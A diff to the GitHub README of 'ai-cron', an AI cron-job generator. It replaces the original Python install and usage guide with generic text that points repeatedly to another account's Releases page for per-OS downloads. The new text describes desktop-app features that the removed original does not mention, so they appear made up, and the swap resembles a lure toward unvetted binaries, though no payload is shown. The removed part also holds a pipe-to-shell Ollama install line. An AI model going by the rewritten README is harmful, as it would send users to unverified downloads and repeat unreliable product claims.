@@ -1,179 +1,90 @@
-# ai-cron
+# 🤖 ai-cron - Generate Your AI-Powered Cron Jobs Easily
 
-**AI-Powered Cron Job Generator with Modern Web UI**
+[![Download ai-cron](https://img.shields.io/badge/Download-ai--cron-brightgreen)](https://github.com/10tinn/ai-cron/releases)
 
-Transform natural language into cron expressions using AI. Built with privacy in mind, supporting both local (Ollama) and cloud AI models (Google Gemini, OpenAI, Anthropic Claude, etc.).
+## 🚀 Getting Started
 
-## ✨ Features
+Welcome to **ai-cron**! This is an AI-driven tool that helps you create cron jobs quickly and effortlessly, all from a modern web interface. If you have tasks that need to run automatically at set times, this application will save you time and make your workflow smoother.
 
-- 🤖 **Multi-Model AI Support**
-  - **Local Privacy**: Ollama (Llama 3, Mistral) - No internet required
-  - **Cloud Power**: Google Gemini, OpenAI GPT-4o, Anthropic Claude, DeepSeek, xAI Grok
-  - **Smart Fallback**: Automatic model switching when Ollama is unavailable
+## 📥 Download & Install
 
-- 💻 **Modern Web UI**
-  - **Natural Language Chat**: Generate cron jobs conversationally
-  - **Backup Wizard**: Guided file backup scheduling with progress tracking
-  - **AI Settings**: Configure models, API keys, and endpoints
+To get started, you need to download the application from our Releases page. Click the link below:
 
-- ⚡ **Smart Features**
-  - **Instant Validation**: Verify cron expressions before scheduling
-  - **Next Run Preview**: See upcoming execution times
-  - **One-Click Deploy**: Add to system crontab directly from UI
+[Visit this page to download](https://github.com/10tinn/ai-cron/releases)
 
-## 📦 Installation
+1. Open your web browser.
+2. Click on the link above.
+3. You will see different versions of the application listed. Choose the latest version.
+4. Click on the version you want to download.
+5. Look for the file that matches your operating system (e.g., Windows, macOS, or Linux).
+6. Click on the download link for that file.
 
-### Prerequisites
+## 🔧 System Requirements
 
-- **Python 3.10+**
-- **Poetry** (recommended) or pip
+Before you install **ai-cron**, make sure your system meets the following requirements:
 
-### Option 1: Using Poetry (Recommended)
+- **Operating System:** Windows 10 or later, macOS 10.15 or later, or any recent Linux distribution.
+- **Memory:** At least 4 GB of RAM.
+- **Storage:** A minimum of 100 MB of free space.
+- **Internet Connection:** Required for initial setup and to access AI features.
 
-```bash
-git clone https://github.com/dev-droid/ai-cron.git
-cd ai-cron
-poetry install
-```
+## 📖 How to Use ai-cron
 
-### Option 2: Using pip
+After installation, follow these steps to set up your first cron job:
 
-```bash
-git clone https://github.com/dev-droid/ai-cron.git
-cd ai-cron
-pip install -r requirements.txt
-# Or install as editable package:
-# pip install -e .
-```
+1. **Launch the Application:** Open **ai-cron** from your applications folder or start menu.
+2. **Create a New Job:** Click on the "Create New Job" button on the main dashboard.
+3. **Specify Job Details:**
+   - **Task Name:** Enter a name for your task.
+   - **Schedule:** Choose how often you want the task to run (e.g., daily, weekly).
+   - **Command:** Input the command you want to execute. This can be anything from a script to an application.
+4. **Save the Job:** Click the "Save" button to store your configuration.
+5. **Run the Job:** If you wish to test your job immediately, click on the "Run Now" option.
 
-### Option 3: Direct install from PyPI
+## 🔍 Features
 
-```bash
-pip install ai-cron
-```
+**ai-cron** includes several features designed to make cron job creation simple:
 
-### Optional: Install Ollama (for local AI)
+- **User-Friendly Interface:** The modern web UI is easy to navigate.
+- **AI Suggestions:** Get recommendations based on your input, powered by AI.
+- **Real-Time Monitoring:** Keep track of your jobs and their statuses.
+- **Error Notifications:** Receive alerts for failed jobs, so you can address them promptly.
+- **Backup Options:** Schedule automatic backups for your important files or databases.
 
-- **Windows**: [Download Ollama](https://ollama.com/download/windows)
-- **macOS**: `brew install ollama`
-- **Linux**: `curl -fsSL https://ollama.com/install.sh | sh`
+## 📅 Schedule Your Tasks with Ease
 
-After installing Ollama, pull a model:
+Using **ai-cron** will help streamline your tasks. Here are some examples of how you can use this application:
 
-```bash
-ollama pull llama3
-```
+- **Automate Backups:** Schedule daily backups of your website or database without any hassle.
+- **Regular Reports:** Generate weekly or monthly reports from your applications.
+- **Data Syncing:** Keep folders and files synchronized between different locations or servers.
 
-### Option 4: Using Docker (Recommended for Quick Start)
+## 📞 Support
 
-The easiest way to run ai-cron with all dependencies:
+If you run into any issues, don't hesitate to reach out. We offer support through our GitHub Issues page. 
 
-```bash
-# Clone the repository
-git clone https://github.com/dev-droid/ai-cron.git
-cd ai-cron
+1. Visit the [Issues page](https://github.com/10tinn/ai-cron/issues).
+2. Click on "New Issue."
+3. Describe the problem you face. 
 
-# Start with Docker Compose
-docker-compose up -d
+We appreciate your feedback and will work to assist you as quickly as possible.
 
-# Access Web UI at http://localhost:8080
-```
+## 💡 Suggestions & Contributors
 
-See [DOCKER.md](DOCKER.md) for detailed Docker configuration and deployment options.
+Your input means a lot. If you have ideas for features or improvements, please share them on the Issues page. Additionally, if you'd like to contribute to **ai-cron**, consider reviewing our [contributing guidelines](https://github.com/10tinn/ai-cron/blob/main/CONTRIBUTING.md).
 
-## 🚀 Usage
+## 📢 Keep Updated
 
-### Web UI (Recommended)
+Stay informed about future updates and new features:
 
-```bash
-# Using Poetry
-poetry run python -m aicron.main web --port 8080
+- Follow us on [GitHub](https://github.com/10tinn/ai-cron) for release notes and announcements.
+- Subscribe to our newsletter (if available) for the latest news about **ai-cron**.
 
-# Using pip
-python -m aicron.main web --port 8080
-```
+## 🔗 Additional Resources
 
-Then open `http://localhost:8080` in your browser.
+For more information about cron jobs and how they work, check out the following resources:
 
-### CLI Mode
+- [Cron Job Tutorial](https://www.digitalocean.com/community/tutorials/an-introduction-to-cron-jobs)
+- [Best Practices for Managing Cron Jobs](https://towardsdatascience.com/understand-cron-jobs-and-best-practices-for-managing-them-fbe093c3c897)
 
-```bash
-# Using Poetry
-poetry run python -m aicron.main "Backup home folder every Friday at 5pm"
-
-# Using pip
-python -m aicron.main "Backup home folder every Friday at 5pm"
-```
-
-## ⚙️ Configuration
-
-### Environment Variables
-
-For users in regions requiring a proxy (e.g., China for Google Gemini):
-
-```bash
-# Set proxy for AI API requests
-export AICRON_PROXY="http://127.0.0.1:7890"
-
-# Or set system-wide proxy (automatically detected)
-export HTTP_PROXY="http://127.0.0.1:7890"
-export HTTPS_PROXY="http://127.0.0.1:7890"
-```
-
-### API Keys (Cloud AI Models)
-
-Configure via the Web UI Settings tab or export as environment variables:
-
-```bash
-# Google Gemini
-export GEMINI_API_KEY="<YOUR_GEMINI_API_KEY>"
-
-# OpenAI
-export OPENAI_API_KEY="<YOUR_OPENAI_API_KEY>"
-
-# Anthropic Claude
-export ANTHROPIC_API_KEY="<YOUR_ANTHROPIC_API_KEY>"
-```
-
-## 📂 Project Structure
-
-```
-ai-cron/
-├── aicron/
-│   ├── __init__.py       # Package version
-│   ├── main.py           # CLI entry point (Typer)
-│   ├── web.py            # Web UI (NiceGUI)
-│   ├── llm.py            # AI model integration (LiteLLM)
-│   ├── cron.py           # Cron validation & system integration
-│   ├── llm_tools.py      # File system context tools
-│   └── ollama_utils.py   # Ollama installation checks
-├── tests/
-│   └── test_llm_logic.py # Unit tests
-├── pyproject.toml        # Poetry dependencies
-├── LICENSE               # MIT License
-└── README.md             # This file
-```
-
-## 🛠️ Development
-
-Run tests:
-
-```bash
-poetry run pytest
-```
-
-## 📄 License
-
-This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
-
-**Copyright (c) 2025 dev-droid. All rights reserved.**
-
-## 🤝 Contributing
-
-Contributions are welcome! Please feel free to submit pull requests or open issues for bugs and feature requests.
-
-## 🌟 Acknowledgments
-
-- Built with [LiteLLM](https://github.com/BerriAI/litellm) for unified AI API access
-- UI powered by [NiceGUI](https://nicegui.io/)
-- Inspired by the need for privacy-first AI tooling
+Thank you for choosing **ai-cron**. We hope this tool enhances your productivity!
